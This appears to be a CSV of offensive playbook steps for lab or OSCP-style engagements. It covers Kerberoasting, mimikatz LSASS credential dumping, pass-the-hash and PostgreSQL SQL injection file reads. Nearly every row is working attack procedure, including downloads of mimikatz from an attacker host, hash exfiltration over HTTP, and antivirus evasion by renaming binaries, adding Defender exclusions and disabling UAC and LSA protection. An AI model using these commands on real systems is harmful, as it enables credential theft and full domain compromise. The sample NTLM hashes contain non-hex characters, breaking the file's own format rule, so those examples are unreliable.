"id","name","objective","description","expected_output","notes"
"enumerate-spns","Enumerate Service Principal Names","Identify all SPNs registered to USER accounts (potential Kerberoasting targets)","SPN ENUMERATION WITHOUT HASH EXTRACTION: Linux → impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME> (no -request flag = enumeration only).
Windows → Rubeus.exe kerberoast (shows SPNs) OR setspn -Q */* (shows ALL SPNs including computer accounts).

OUTPUT ANALYSIS: ServicePrincipalName (service type and hostname), Name (account name), MemberOf (group membership - prioritize privileged accounts), PasswordLastSet (old = weak password likely).

FILTER TARGETS:
(1) IGNORE computer accounts (ending in $) - 120-char random passwords, uncrackable.
(2) IGNORE MSA/gMSA accounts (managed service accounts) - 120-char random passwords, uncrackable.
(3) TARGET user accounts with SPNs (sql_service, iis_service, svc_*, etc.).

PRIORITIZATION:
(1) Old PasswordLastSet dates (>1 year = weak password likely).
(2) Privileged group membership (Domain Admins, high-value).
(3) Common service names (sql_service often has 'Password1!' or similar).

TIME ESTIMATE: 5-10 seconds for enumeration.

EXPECTED RESULTS: 0-10 user SPNs typical.
0 SPNs = less common but possible (all services run as computer accounts).
>10 = large environment or many custom services.","",""
"filter-spn-accounts","Filter Out Computer and Managed Service Accounts","Remove uncrackable accounts (computer accounts and MSAs) from target list","COMPUTER ACCOUNTS: Identified by $ at end of name (e.g., WEB01$, SQL-SERVER$).
PASSWORD POLICY: 120 characters, random, auto-rotated every 30 days by AD.
UNCRACKABLE with current technology (120-char keyspace = infeasible).
FILTER OUT: Do NOT request TGS for computer accounts - wastes time and generates unnecessary traffic.

MANAGED SERVICE ACCOUNTS (MSA/gMSA): Identified by msDS-ManagedServiceAccount objectClass OR msDS-GroupManagedServiceAccount.
Same 120-char random password policy.
UNCRACKABLE.
FILTER OUT: Exclude from Kerberoasting targets.

USER SERVICE ACCOUNTS: Regular user accounts (not ending in $, not MSA) with servicePrincipalName attribute.
PASSWORD POLICY: Standard domain user policy (often 7-14 chars, user-chosen password).
CRACKABLE if weak password (Password1!, ServiceAccount123!, company name + year).
TARGET THESE: sql_service, iis_service, svc_backup, svc_admin, etc.

VERIFICATION: impacket-GetUserSPNs output 'Name' column should NOT end in $ for target accounts.

OSCP TIP: If all SPNs are on computer accounts (all names end in $), Kerberoasting attack surface is zero.
Document and proceed to alternative attacks (AS-REP roasting, password spraying).","",""
"request-tgs-hashes","Request TGS Tickets and Extract Hashes","Request service tickets (TGS) for targeted SPNs and extract TGS-REP hashes for offline cracking","LINUX: impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>.
The -request flag triggers TGS requests for ALL identified user SPNs.
Output shows TGS-REP hashes in Hashcat mode 13100 format.
Add -outputfile hashes.kerberoast to save to file.

WINDOWS: Rubeus.exe kerberoast /outfile:C:\hashes.kerberoast.
Automatically requests TGS for all user SPNs and extracts hashes.

CRITICAL: Rubeus may show 'NOTICE: AES hashes will be returned for AES-enabled accounts' - this means TGS is encrypted with AES (slower to crack).
Use /tgtdeleg flag to force RC4 downgrade: Rubeus.exe kerberoast /tgtdeleg /outfile:C:\hashes_rc4.kerberoast.

HASH FORMAT: $krb5tgs$23$ = Kerberos 5 TGS-REP etype 23 (RC4-HMAC) = Hashcat mode 13100.
$krb5tgs$17$ or $krb5tgs$18$ = AES encryption = Hashcat mode 19600/19700 (slower).

RC4 VS AES: RC4 cracking ~10x faster than AES.
If Rubeus shows AES, use /tgtdeleg to downgrade.

TIME ESTIMATE: <10 seconds for hash extraction.

EXPECTED OUTPUT: One $krb5tgs$ hash per user SPN from step 3.","",""
"transfer-hashes","Transfer Hashes to Cracking System (If Needed)","Move TGS-REP hash files from Windows to Linux Kali system for Hashcat cracking","SKIP IF: Hashes extracted on Kali with impacket-GetUserSPNs.
Proceed directly to step 6 (crack-tgsrep-hashes).

REQUIRED IF: Hashes extracted on Windows with Rubeus.
Transfer to Kali for cracking (better wordlists, GPU support).

TRANSFER METHODS:
(1) SMB SHARE: Kali → sudo impacket-smbserver share /home/kali/hashes -smb2support -username user -password pass.
Windows → copy C:\hashes.kerberoast \\KALI_IP\share\.

(2) RDP DISK SHARE: rdesktop -r disk:share=/home/kali/hashes <WINDOWS_IP>, Windows → copy C:\hashes.kerberoast \\tsclient\share\.

(3) BASE64 ENCODE: Windows → certutil -encode C:\hashes.kerberoast C:\hashes.b64, copy output to Kali, base64 -d > hashes.kerberoast.

(4) PYTHON HTTP: Kali → python3 -m http.server 8000, Windows → Invoke-WebRequest -Uri http://KALI_IP:8000 -Method POST -InFile C:\hashes.kerberoast.

VERIFICATION: cat hashes.kerberoast on Kali shows $krb5tgs$23$ hashes.
wc -l hashes.kerberoast shows hash count matches Windows extraction.

TIME ESTIMATE: 30-90 seconds.","",""
"crack-tgsrep-hashes","Crack TGS-REP Hashes with Hashcat Mode 13100","Recover plaintext service account passwords from TGS-REP hashes using dictionary and rule-based attacks","HASHCAT MODE: 13100 (Kerberos 5, etype 23, TGS-REP).
VERIFY: hashcat --help | grep -i 'Kerberos' shows mode 13100 for TGS-REP.

ATTACK STRATEGY:
(1) STRAIGHT DICTIONARY: hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force (14M passwords, try first).

(2) RULE-BASED: hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (adds mutations).

(3) TARGETED: Service account passwords often follow patterns: ServiceName (sql → MSSQLService), ServiceName + year (iis → IIS2019!), Company name (Acme → AcmeSQL123!).
Create custom wordlist.

(4) COMPREHENSIVE: Use rockyou-30000.rule for thorough attack (30K mutations, takes hours).

--force FLAG: Required in VM without GPU.

MONITORING: Press 's' for status, --status --status-timer=30 for updates.

RC4 vs AES: RC4 (mode 13100) much faster.
AES (mode 19600/19700) 10x slower.
Prefer RC4 hashes from Rubeus /tgtdeleg.

TIME ESTIMATE: Weak password (dictionary word + number) = 5-30 minutes with rules.
Medium password (10 random chars) = hours to days.
Strong password (12+ random) = infeasible.","",""
"extract-passwords","Extract and Document Cracked Passwords","Extract plaintext passwords from Hashcat output and document service account credentials","HASHCAT POTFILE: All cracked passwords automatically saved to ~/.hashcat/hashcat.potfile.

VIEW RESULTS: hashcat -m 13100 hashes.kerberoast --show.
Output format: hash:password OR username:hash:password (if --username flag used).

EXTRACT PASSWORDS: hashcat -m 13100 hashes.kerberoast --show --outfile-format=2 shows passwords only (no hashes).
Better for documentation: --outfile-format=5 shows hash:password pairs.

PARSE OUTPUT: For impacket format: grep '$krb5tgs' output shows full hash.
Extract username from hash: $krb5tgs$23$*USERNAME$REALM$...
Extract password after final colon.
For Rubeus format: output shows SamAccountName and password.

DOCUMENTATION: Create credentials file: echo 'iis_service:Strawberry1' >> service_creds.txt.
Document:
(1) Service account name.
(2) Plaintext password.
(3) Associated SPN (HTTP/web04.corp.com).
(4) Group membership (from step 2 enumeration).

TIME ESTIMATE: <30 seconds to extract and document.","",""
"validate-service-credentials","Validate Service Account Credentials and Check Privileges","Confirm cracked service account passwords are valid and identify privilege level and lateral movement opportunities","CREDENTIAL VALIDATION: Use crackmapexec to test credentials.

SINGLE TARGET: crackmapexec smb <DC_IP> -u iis_service -p 'Strawberry1' -d corp.com.
Output: [+] corp.com\iis_service:Strawberry1 confirms valid.

SUBNET SCAN: crackmapexec smb 192.168.50.0/24 -u iis_service -p 'Strawberry1' -d corp.com scans /24 subnet for admin rights.
(Pwn3d!) indicator = local admin on that system.

SERVICE ACCOUNT PRIVILEGES: Service accounts are often OVER-PRIVILEGED:
(1) Local admin on multiple servers (database servers, web servers).
(2) Domain admin membership (poor security practice but common).
(3) High-privilege groups (Backup Operators, Server Operators).
(4) Excessive permissions (GenericAll, WriteDACL on domain objects).

PRIVILEGE CHECK: net user iis_service /domain (shows group membership).
Get-DomainUser iis_service -Properties memberof (PowerView).

LATERAL MOVEMENT: If (Pwn3d!) found → use psexec, evil-winrm, wmiexec for SYSTEM shell.
If Domain Admin → full domain compromise immediately.
If standard service account → enumerate further for privilege escalation paths.

TIME ESTIMATE: Validation (5 sec), subnet scan (2-4 min), privilege analysis (30 sec).","",""
"upload-mimikatz","Upload Mimikatz Binary to Target System","Transfer mimikatz.exe to writable directory on target Windows system","Upload mimikatz binary to target system using available transfer method. Choose writable directory that won't trigger AV.

Transfer Methods (Priority Order):

1. Evil-WinRM Upload (Easiest, built-in):
   - From Evil-WinRM session: cd C:\\temp
   - Upload: upload /path/to/mimikatz.exe
   - Verify: dir mimikatz.exe (should show ~1.2 MB)

2. SMB Copy (Fast, requires SMB server):
   - Start SMB server: impacket-smbserver share /path/to/mimikatz -smb2support
   - From target: copy \\\\<ATTACKER_IP>\\share\\mimikatz.exe C:\\temp\\
   - Verify: dir C:\\temp\\mimikatz.exe

3. PowerShell Download (Requires HTTP server):
   - Start HTTP server: python3 -m http.server 80
   - From target: IWR -Uri http://<ATTACKER_IP>/mimikatz.exe -OutFile C:\\temp\\mimikatz.exe
   - Verify: Get-FileHash C:\\temp\\mimikatz.exe

4. Certutil Download (Alternative):
   - Start HTTP server: python3 -m http.server 80
   - From target: certutil -urlcache -split -f http://<ATTACKER_IP>/mimikatz.exe C:\\temp\\mimikatz.exe
   - Verify: certutil -hashfile C:\\temp\\mimikatz.exe MD5

Writable Directories (Priority Order):
1. C:\\temp (may not exist - create with: mkdir C:\\temp)
2. C:\\Users\\Public
3. C:\\Windows\\temp (requires higher privileges)
4. C:\\Users\\<USERNAME>\\AppData\\Local\\Temp
5. C:\\ProgramData

Antivirus Evasion:
- Use obfuscated mimikatz (mimikatz_trunk.7z from GitHub, extract and rename)
- Rename binary: mv mimikatz.exe windowsupdate.exe
- Add to exclusions: Add-MpPreference -ExclusionPath C:\\temp (requires admin)
- Use alternative: pypykatz (Python, less detected)
- In-memory execution: Invoke-Mimikatz (PowerShell, no disk write)

Verification:
1. File exists: dir C:\\temp\\mimikatz.exe
2. Correct size: ~1.2 MB (1,355,776 bytes for v2.2.0)
3. File hash matches: Compare with known good hash
4. Test execution: .\\mimikatz.exe ""exit"" (should run without error)
5. No AV alert: Check Windows Defender quarantine (Get-MpThreatDetection)

Troubleshooting:
- AV deletes immediately: Disable Defender OR use obfuscated version OR use in-memory
- Upload fails: Check network connectivity, try alternative method
- No writable directory: Create C:\\temp or use %TEMP% environment variable
- File corrupted: Verify transfer (compare file size/hash), re-upload
- Permission denied: Verify local admin with: whoami /groups | findstr Admin","",""
"enable-sedbugprivilege","Enable SeDebugPrivilege with privilege::debug","Enable SeDebugPrivilege token required for LSASS memory access - MANDATORY prerequisite","Run mimikatz 'privilege::debug' command to enable SeDebugPrivilege. This step is MANDATORY and MUST come before any sekurlsa commands.

Command Execution:
```
cd C:\\temp
.\\mimikatz.exe ""privilege::debug"" ""exit""
```

Expected Output (SUCCESS):
```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  ""A La Vie, A L'Amour"" - (oe.eo)
 ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # exit
Bye!
```

KEY INDICATORS OF SUCCESS:
- ""Privilege '20' OK"" message
- No error messages
- Exit cleanly

Expected Output (FAILURE):
```
mimikatz # privilege::debug
Privilege '20' KO
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
```

This indicates:
- Not running as local administrator, OR
- UAC is blocking privilege elevation, OR
- SeDebugPrivilege not available in token

WHY THIS IS MANDATORY:
Even local administrators have SeDebugPrivilege in their token, but it's DISABLED by default. Mimikatz 'privilege::debug' ENABLES it. Without enabled SeDebugPrivilege:
- Cannot read LSASS process memory
- sekurlsa commands return ERROR 0x00000005 (Access Denied)
- Credential dump fails completely

Technical Details:
SeDebugPrivilege (Privilege ID 20) allows:
- Reading memory of any process (including protected processes)
- Bypassing normal security checks
- Required for LSASS memory dump (LSASS is protected process)

Verification Methods:

1. Mimikatz output (primary):
   - ""Privilege '20' OK"" = Success
   - ""Privilege '20' KO"" = Failure

2. Windows command (secondary):
   ```
   whoami /priv | findstr SeDebugPrivilege
   ```
   Before: SeDebugPrivilege  Disabled
   After mimikatz: SeDebugPrivilege  Enabled

3. Test sekurlsa command:
   ```
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""
   ```
   If privilege::debug worked: Credentials appear
   If failed: ERROR 0x00000005

Troubleshooting:

1. ""Privilege '20' KO"":
   - Verify local admin: whoami /groups | findstr ""S-1-5-32-544""
   - Get SYSTEM shell: psexec -s -i cmd.exe (from Sysinternals)
   - Disable UAC: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f (requires reboot)

2. UAC Blocking:
   - Run from elevated command prompt (if RDP access)
   - Use PSExec to get SYSTEM shell (SYSTEM always has SeDebugPrivilege)
   - Disable UAC temporarily

3. Token Doesn't Have Privilege:
   - User not in Administrators group (recheck access)
   - Restricted token (some lateral movement methods create restricted shells)
   - Use alternative access method (Evil-WinRM usually provides full token)

Alternative Methods (if privilege::debug fails):
- Use PSExec to get SYSTEM shell: impacket-psexec user@target (SYSTEM has SeDebugPrivilege by default)
- Disable LSA protection: reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /f (requires reboot)
- Use alternative tools: pypykatz (different implementation), procdump (uses different method)","",""
"dump-lsass-memory","Dump LSASS Credentials with sekurlsa::logonpasswords","Extract all cached credentials from LSASS memory and save to file for analysis","Execute mimikatz sekurlsa::logonpasswords to dump all credentials cached in LSASS memory. MUST redirect output to file (output too long for terminal).

Command Execution:
```
cd C:\\temp
.\\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > credentials.txt
```

Command Breakdown:
- privilege::debug: Enable SeDebugPrivilege (from step 2)
- sekurlsa::logonpasswords: Dump all logon session credentials
- exit: Close mimikatz cleanly
- > credentials.txt: Redirect output to file (CRITICAL - output very long)

Execution Time:
- Small system (<4GB RAM): 2-3 seconds
- Medium system (4-16GB RAM): 5-10 seconds
- Large system (>16GB RAM): 10-30 seconds
- Busy Domain Controller: 30-60 seconds

Expected Output Structure (in credentials.txt):
```
Authentication Id : 0 ; 12345678 (00000000:00bc614e)
Session           : Service from 0
User Name         : administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 11/24/2025 10:30:15 AM
SID               : S-1-5-21-1234567890-1234567890-1234567890-500
        msv :
         [00000003] Primary
         * Username : administrator
         * Domain   : CORP
         * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
         * SHA1     : 1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0
        tspkg :
        wdigest :
         * Username : administrator
         * Domain   : CORP
         * Password : (null)  [OR plaintext password if WDigest enabled]
        kerberos :
         * Username : administrator
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :

[... repeats for each cached credential ...]
```

Key Fields to Extract:

1. Session Type:
   - ""Service from 0"": GOLDMINE - persists until reboot, check these FIRST
   - ""Interactive from 2"": Current user logged in (may log out soon)
   - ""RemoteInteractive from 10"": RDP session (similar to interactive)

2. Username/Domain:
   - Format: DOMAIN\\username
   - Look for: administrator, domain admin accounts, svc_* service accounts

3. NTLM Hash:
   - 32 hexadecimal characters (0-9, a-f)
   - This is what you need for Pass-the-Hash
   - Located under ""msv :"" section

4. Plaintext Password:
   - Under ""wdigest :"" section
   - Usually ""(null)"" on Windows 8.1+ (WDigest disabled by default)
   - If present: GOLDMINE - use directly, no PTH needed

5. Logon Server:
   - Shows Domain Controller name
   - Confirms domain account (not local)

Output Size:
- Typical workstation: 50-200 lines
- Server: 200-500 lines
- Domain Controller: 500-2000+ lines

Troubleshooting:

1. ERROR 0x00000005 Access Denied:
   - Cause: Forgot privilege::debug (step 2)
   - Solution: Run command again with privilege::debug included

2. Empty Output / No Credentials:
   - Cause: System recently rebooted, no logins yet
   - Solution: Wait for user logins, target different system

3. Only Computer Accounts (HOSTNAME$):
   - Cause: No user sessions cached
   - Solution: Target different system, check servers

4. Empty NTLM/Password Fields:
   - Cause: WDigest disabled (Windows 8.1+ default)
   - Solution: Extract Kerberos tickets instead (sekurlsa::tickets)

5. LSASS Protected (ERROR):
   - Cause: Credential Guard enabled, LSA protection
   - Solution: Disable protection (reg delete), use alternative method

6. Output Too Long for Terminal:
   - Cause: Forgot to redirect to file
   - Solution: Re-run with ""> credentials.txt""

Alternative Commands:

1. Export to different format:
   ```
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords /format:list"" ""exit"" > creds_list.txt
   ```

2. Dump specific authentication package:
   ```
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::msv"" ""exit""  # NTLM only
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::wdigest"" ""exit""  # Plaintext only
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::kerberos"" ""exit""  # Kerberos only
   ```

3. Export tickets:
   ```
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export"" ""exit""
   ```","",""
"parse-extract-credentials","Parse Output and Extract High-Value Credentials","Parse mimikatz output to extract NTLM hashes and identify Domain Admin credentials","Parse the credentials.txt file to extract NTLM hashes, map to usernames, and identify high-value targets (Domain Admins, service accounts).

Parsing Process:

1. Open credentials.txt:
   ```
   type C:\\temp\\credentials.txt | more
   ```
   OR download for local parsing:
   ```
   download C:\\temp\\credentials.txt  # From Evil-WinRM
   ```

2. Search for Key Patterns:
   - ""Session           : Service from 0"" (PRIORITY - persistent sessions)
   - ""* NTLM     :"" (followed by 32 hex characters)
   - ""* Username :"" (extract username)
   - ""* Domain   :"" (extract domain)

3. Extract Credentials:
   For each session, capture:
   - Session Type
   - Username
   - Domain
   - NTLM Hash (32 hex chars)
   - Logon Server (confirms DC)

Manual Extraction Example:
Input (credentials.txt):
```
Authentication Id : 0 ; 123456
Session           : Service from 0
User Name         : administrator
Domain            : CORP
Logon Server      : DC01
        msv :
         * Username : administrator
         * Domain   : CORP
         * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

Extracted Credential:
```
CORP\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
Session: Service from 0 (persistent)
Logon Server: DC01
```

Automated Parsing (PowerShell):
```powershell
$content = Get-Content C:\\temp\\credentials.txt
$credentials = @()

for ($i = 0; $i -lt $content.Length; $i++) {
    if ($content[$i] -match 'User Name\\s+:\\s+(.+)') {
        $username = $Matches[1].Trim()
    }
    if ($content[$i] -match 'Domain\\s+:\\s+(.+)') {
        $domain = $Matches[1].Trim()
    }
    if ($content[$i] -match '\\* NTLM\\s+:\\s+([a-f0-9]{32})') {
        $ntlm = $Matches[1]
        $credentials += ""$domain\\$username:$ntlm""
    }
}

$credentials | Out-File C:\\temp\\extracted_creds.txt
```

Automated Parsing (Linux - grep):
```bash
grep -A 10 ""Session"" credentials.txt | grep -E ""Session|Username|Domain|NTLM"" > parsed.txt
```

Prioritization Strategy:

1. Identify Domain Admins:
   ```
   net group ""Domain Admins"" /domain
   ```
   Cross-reference extracted usernames with this list.

2. Priority Order:
   - Administrator (built-in DA, RID 500)
   - Domain Admin group members
   - Enterprise Admins
   - Service accounts (svc_*, sql_*, backup_*)
   - IT/helpdesk accounts (it_admin, helpdesk, etc.)
   - Standard users (lowest priority)

3. Session Type Priority:
   - Service from 0 (HIGHEST - persists until reboot)
   - Interactive from 2 (Medium - current user, may log out)
   - RemoteInteractive from 10 (Medium - RDP session)
   - Network sessions (Lowest - temporary)

Hash Format Validation:
- NTLM hash: EXACTLY 32 hexadecimal characters (0-9, a-f)
- Valid example: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
- Invalid formats:
  - 40 chars = SHA1 (can't use for PTH)
  - 16 chars = partial hash (corrupted)
  - Contains spaces/special chars = parsing error

Expected Findings:
- Typical workstation: 5-15 credentials
- At least 1-2 Domain Admin accounts (if workstation active)
- Computer accounts (HOSTNAME$) - ignore these
- Local accounts (domain = hostname) - ignore, focus on DOMAIN\\user

Create Credential List:
```
HIGH PRIORITY (Domain Admins):
CORP\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
CORP\\svc_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1

MEDIUM PRIORITY (Service Accounts):
CORP\\svc_backup:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2
CORP\\sql_service:d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3

LOW PRIORITY (Standard Users):
CORP\\john:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4
```

Troubleshooting:
- No NTLM hashes: Check if WDigest disabled, extract Kerberos tickets instead
- Hash extraction fails: Verify format (32 hex chars), check for whitespace
- Can't determine DA membership: Run 'net group ""Domain Admins"" /domain' from target
- Duplicate entries: Same user may appear multiple times (different sessions), use most recent","",""
"validate-credentials","Validate Credentials with Pass-the-Hash","Test extracted NTLM hashes to confirm they work and identify Domain Admin access","Use crackmapexec to validate extracted NTLM hashes work for domain authentication and confirm which accounts have Domain Admin privileges.

Validation Command:
```
crackmapexec smb <DC_IP> -u <username> -H <NTLM_hash> -d <DOMAIN>
```

Example:
```
crackmapexec smb 10.10.10.10 -u administrator -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 -d CORP
```

Expected Output (Domain Admin):
```
SMB  10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP) (signing:True)
SMB  10.10.10.10  445  DC01  [+] CORP\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 (Pwn3d!)
```

Key Indicators:
- [+] = Authentication successful
- (Pwn3d!) = Domain Admin privileges (can write to C$ on DC)
- [name:DC01] = Domain Controller identification

Expected Output (Valid User, Not DA):
```
SMB  10.10.10.10  445  DC01  [+] CORP\\john:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4
```

Note: No ""Pwn3d!"" = Valid credentials but NOT Domain Admin. Can still use for lateral movement.

Expected Output (Failed):
```
SMB  10.10.10.10  445  DC01  [-] CORP\\baduser:badhash STATUS_LOGON_FAILURE
```

Batch Validation (Multiple Credentials):

Create credential file (creds.txt):
```
administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
svc_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1
svc_backup:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2
john:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4
```

Batch test script:
```bash
#!/bin/bash
DC=""10.10.10.10""
DOMAIN=""CORP""

while IFS=':' read -r user hash; do
    echo ""[*] Testing $user...""
    crackmapexec smb $DC -u $user -H $hash -d $DOMAIN
    echo """"
done < creds.txt
```

Validation Results Documentation:
```
DOMAIN ADMINS (Pwn3d!):
- CORP\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 ✓
- CORP\\svc_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1 ✓

VALID USERS (No Pwn3d):
- CORP\\john:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4 ✓

FAILED:
- CORP\\disabled_account:... ✗ (STATUS_LOGON_FAILURE)
```

Find Domain Controller:
If DC IP unknown:
1. From compromised system:
   ```
   nltest /dclist:CORP
   ```
2. DNS query:
   ```
   nslookup -type=SRV _ldap._tcp.dc._msdcs.CORP.LOCAL
   ```
3. Port scan:
   ```
   nmap -p 88,389,636,445 10.10.10.0/24
   ```
   Look for systems with Kerberos (88), LDAP (389), SMB (445)

Alternative Validation Methods:

1. Evil-WinRM PTH:
   ```
   evil-winrm -i <DC_IP> -u administrator -H <hash>
   ```
   If connects: Valid credentials
   If DA: Can access C:\\Users\\Administrator

2. Impacket PSExec:
   ```
   impacket-psexec -hashes :<hash> CORP/administrator@<DC_IP>
   ```
   If gets shell: Valid DA credentials

3. SMB Enumeration:
   ```
   smbclient //DC01/C$ -U administrator --pw-nt-hash <hash>
   ```
   If lists files: Valid DA credentials

Troubleshooting:
- Connection timeout: Check network routing, firewall, DC online
- STATUS_LOGON_FAILURE: Hash incorrect, account disabled, or wrong domain
- [+] but no Pwn3d: Valid user but NOT Domain Admin, can use for lateral movement
- Account lockout: Test 1 credential at a time, wait between attempts
- Clock skew: Sync time with DC (ntpdate <DC_IP>)

Next Steps After Validation:
1. Domain Admin found: Proceed to DC access and flag retrieval
2. Valid users only: Use for lateral movement to more systems
3. All failed: Re-dump credentials, check for stale hashes","",""
"detect-sqli","Detect SQL Injection Vulnerability","Confirm SQL injection exists and identify database type","Test for SQL injection by injecting single quote in POST parameters.
Look for PostgreSQL-specific error messages indicating vulnerable parameter.","",""
"enum-columns","Enumerate Column Count","Determine number of columns in SQL query for UNION attack","Use ORDER BY technique to count columns.
Increment ORDER BY value until error occurs, revealing column count.","",""
"test-union","Test UNION SELECT Injection","Confirm UNION injection works and identify displayed columns","Test UNION SELECT with NULL values matching column count.
Use test strings to identify which column positions display on page.","",""
"extract-db-info","Extract PostgreSQL Database Information","Enumerate database version, name, user, and superuser status","Use UNION SELECT to extract: version(), current_database(), current_user, usesuper status.
Verify if database user has superuser privileges (required for file functions).","",""
"extract-credentials","Extract Database Credentials from Config File","Read database configuration file to obtain plaintext password","Use pg_read_file() via UNION SELECT to read common config file locations: /var/www/html/dbcon.php, /var/www/html/config.php, /etc/webapp/database.conf.
Extract username and password from file contents.","",""
"connect-postgres","Establish Direct PostgreSQL Connection","Connect to PostgreSQL database using extracted credentials","Use psql client to connect directly to PostgreSQL server on port 5432.
Bypass web application layer entirely.
Verify connection success and superuser privileges.","",""
"verify-privileges","Verify Superuser Privileges","Confirm superuser status and available file functions","Verify usesuper is TRUE and test pg_ls_dir() and pg_read_file() functions are available.
Confirm postgres user file access permissions.","",""
"enum-filesystem","Enumerate Filesystem for Sensitive Files","Systematically search filesystem for flags, credentials, or sensitive data","Use pg_ls_dir() to list directories.
Check common locations: /, /home, /tmp, /var, /var/www, /opt, /root (if accessible).
Look for flag.txt, credentials, .ssh keys, or other sensitive files.","",""
"retrieve-file","Retrieve Sensitive File Contents","Read target file using pg_read_file() and extract contents","Use pg_read_file('/path/to/file') to read file contents.
For large files, may need to read in chunks using offset/length parameters.","",""
